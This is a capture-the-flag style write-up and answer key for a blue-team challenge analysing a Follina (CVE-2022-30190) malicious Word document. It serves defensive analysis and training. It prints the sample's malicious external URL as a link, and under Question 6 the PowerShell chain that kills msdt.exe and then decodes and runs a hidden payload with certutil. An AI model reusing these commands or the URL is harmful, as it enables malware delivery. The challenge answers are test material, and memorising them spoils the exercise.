# [Follina](https://blueteamlabs.online/home/challenge/follina-f1a3452f34)

On a Friday evening when you were in a mood to celebrate your weekend, your team was alerted with a new RCE vulnerability actively being exploited.

**Scenario**

On a Friday evening when you were in a mood to celebrate your weekend, your team was alerted with a new RCE vulnerability actively being exploited in the wild. You have been tasked with analyzing and researching the sample to collect information for the weekend team.

<img width="940" height="538" alt="image" src="https://github.com/user-attachments/assets/00c5c006-1186-4431-9ec4-a31237cbf760" />

**Question 1)** What is the SHA1 hash value of the sample?

<img width="940" height="426" alt="image" src="https://github.com/user-attachments/assets/213ec30c-44e8-41eb-a3bc-90052a84dd2f" />

**Answers: 06727ffda60359236a8029e0b3e8a0fd11c23313**

**Question 2)** According to VirusTotal, what is the full filetype of the provided sample?

<img width="940" height="446" alt="image" src="https://github.com/user-attachments/assets/1b2ee6a0-beb6-497e-8c36-25f6d6664a2b" />

**Answers:** **Office Open XML Document**

**Question 3)** Extract the URL that is used within the sample and submit it

<img width="940" height="314" alt="image" src="https://github.com/user-attachments/assets/d2e584c7-b62b-424c-b2a1-9bbeb394c1a6" />

**Answers:**

[**https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/** **RDF842l.html**](https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/%20%20%20%20%20%20%20RDF842l.html%20)

**Question 4)** What is the name of the XML file that is storing the extracted URL?

Since this URL is e a Word document structure, in Office Open XML documents, external links are typically stored in the word/\_rels/document.xml.rels file. That’s the XML file responsible for holding relationship data, including hyperlinks and external resource references.

<img width="940" height="301" alt="image" src="https://github.com/user-attachments/assets/e2561dc7-d6b6-4b7a-9781-b0ce2b458f0b" />

**Answers: document.xml.rels**

**Question 5)** The extracted URL accesses a HTML file that triggers the vulnerability to execute a malicious payload. According to the HTML processing functions, any files with fewer than <Number> bytes would not invoke the payload. Submit the <Number>

From the analysis of John Hammond on Huntress

<img width="940" height="301" alt="image" src="https://github.com/user-attachments/assets/e2561dc7-d6b6-4b7a-9781-b0ce2b458f0b" />

<img width="940" height="442" alt="image" src="https://github.com/user-attachments/assets/ef60c241-11a8-423b-ac3f-0b2427f78287" />

**Answers: 4096**

**Question 6)** After execution, the sample will try to kill a process if it is already running. What is the name of this process?

**$cmd = "c:\\windows\\system32\\cmd.exe";**

**Start-Process $cmd -windowstyle hidden -ArgumentList "/c taskkill /f /im msdt.exe";**

**Start-Process $cmd -windowstyle hidden -ArgumentList "/c cd C:\\users\\public\\&&for /r %temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y&&findstr TVNDRgAAAA 1.rar>1.t&&certutil -decode 1.t 1.c &&expand 1.c -F:\* .&&rgb.exe";**

After extracting the content of the downloaded sample and we can see that in the second line, it will try to kill msdt.exe if it is running

**Answers: msdt.exe**

**Question 7)** You were asked to write a process-based detection rule using Windows Event ID 4688. What would be the ProcessName and ParentProcessname used in this detection rule? \[Hint: OSINT time!\]

<img width="940" height="439" alt="image" src="https://github.com/user-attachments/assets/6d6ae830-1d2d-4e46-ab17-403457f3fdc6" />

The attacker will create msdt.exe under the parent process WINWORD.EXE

<img width="940" height="715" alt="image" src="https://github.com/user-attachments/assets/e749bb7a-450e-4d15-90e1-6e12c757c9af" />

**Answers: msdt.exe, WINWORD.EXE**

**Question 8)** Submit the MITRE technique ID used by the sample for Execution \[Hint: Online sandbox platforms can help!\]

Because the sample create msdt.exe under WINWORD.EXE, we can say that this is inter-process communication

<img width="492" height="688" alt="image" src="https://github.com/user-attachments/assets/607f29d1-57de-4a48-8df8-43a08b35be3a" />

**Answers: T1559**

**Question 9)** Submit the CVE associated with the vulnerability that is being exploited

<img width="940" height="490" alt="image" src="https://github.com/user-attachments/assets/e793ac31-fd4c-4d52-a565-0b60e64c3dc0" />

**Answers: CVE-2022-30190**




















